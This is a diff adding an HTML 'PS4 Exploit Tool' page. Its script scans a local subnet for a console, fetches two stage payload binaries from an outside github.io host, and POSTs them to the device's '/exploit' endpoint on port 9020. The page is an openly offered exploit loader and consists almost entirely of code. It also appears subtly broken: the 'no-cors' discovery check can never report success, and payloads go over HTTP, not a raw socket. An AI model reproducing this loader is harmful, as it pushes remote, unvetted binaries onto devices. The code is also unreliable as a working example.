@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 Exploit</title>
+    <script>
+        async function runExploit() {
+            try {
+                const subnet = document.getElementById('subnet').value;
+                const port = document.getElementById('port').value;
+                
+                document.getElementById('status').innerText = 'Discovering PS4...';
+                const ps4Ip = await discoverPS4(subnet, port);
+                if (!ps4Ip) {
+                    alert('PS4 not found on the network.');
+                    return;
+                }
+
+                document.getElementById('status').innerText = `PS4 found at ${ps4Ip}. Sending payloads...`;
+
+                const primaryPayload = await fetchPayload('https://alihussien96.github.io/payload.bin');
+                const stage2Payload = await fetchPayload('https://alihussien96.github.io/stage2_11.00.bin');
+
+                await sendPayload(ps4Ip, port, primaryPayload);
+                console.log('Primary payload sent successfully');
+
+                await sendPayload(ps4Ip, port, stage2Payload);
+                console.log('Stage 2 payload sent successfully');
+
+                document.getElementById('status').innerText = 'Payloads sent successfully. Check your PS4.';
+            } catch (error) {
+                console.error('Error running exploit:', error);
+                document.getElementById('status').innerText = `Error: ${error.message}`;
+            }
+        }
+
+        async function fetchPayload(url) {
+            const response = await fetch(url);
+            if (!response.ok) {
+                throw new Error(`Failed to fetch ${url}: ${response.statusText}`);
+            }
+            return new Uint8Array(await response.arrayBuffer());
+        }
+
+        async function sendPayload(ps4Ip, port, payload) {
+            const endpoint = `http://${ps4Ip}:${port}/exploit`; // The endpoint on the PS4
+            const response = await fetch(endpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/octet-stream',
+                },
+                body: payload
+            });
+            if (!response.ok) {
+                throw new Error(`Failed to send payload to ${endpoint}: ${response.statusText}`);
+            }
+        }
+
+        async function discoverPS4(subnet, port) {
+            for (let i = 1; i < 255; i++) {
+                const ip = `${subnet}.${i}`;
+                try {
+                    const response = await fetch(`http://${ip}:${port}/discover`, { method: 'GET', mode: 'no-cors' });
+                    if (response.ok) {
+                        console.log(`PS4 found at ${ip}`);
+                        return ip;
+                    }
+                } catch (error) {
+                    // Ignore errors, just continue scanning
+                }
+            }
+            return null;
+        }
+    </script>
+</head>
+<body>
+    <h1>PS4 Exploit Tool</h1>
+    <label for="subnet">Subnet:</label>
+    <input type="text" id="subnet" placeholder="192.168.1" value="192.168.1">
+    <label for="port">Port:</label>
+    <input type="text" id="port" placeholder="9020" value="9020">
+    <button onclick="runExploit()">Run Exploit</button>
+    <p id="status">Status: Idle</p>
+</body>
+</html>
